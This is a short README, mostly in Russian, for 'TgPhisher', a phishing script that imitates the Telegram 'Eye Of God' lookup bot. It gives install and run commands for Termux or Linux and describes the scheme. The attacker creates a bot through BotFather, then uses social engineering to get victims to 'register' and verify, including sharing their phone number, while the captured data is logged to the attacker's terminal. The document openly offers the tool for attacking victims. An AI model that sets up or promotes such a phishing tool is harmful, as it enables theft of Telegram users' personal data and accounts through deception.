# TgPhisher
Telegram bot « Eye Of God » phishing script

# Установка (Termux/Linux)

```
apt update && apt upgrade -y
apt install python3 git python3-pip
git clone https://github.com/TheCyberStalker/TgPhisher
cd TgPhisher
pip3 install -r requirements.txt
python3 tgphisher.py
```
# небольшая документация

Для того чтобы создать бота вы в поиске телеграм
ищете @BotFather, далее создаем и оформляем бота
полученный токен апи вставляем в TgPhisher, он будет работать с скрипта 
в котором заложены данные такие как сообщения глаз бога, тех работы, поделиться номером.

Сама суть заключается в том что атакующий (вы), путём социальной
инженерии заставляете жертву "якобы" зарегистрироваться в глаз бога, мол это бот для пробива!
пользователь проходить верификацию точь в точь как Глаз бога, а логи из полученных данных мы получаем
в терминал!
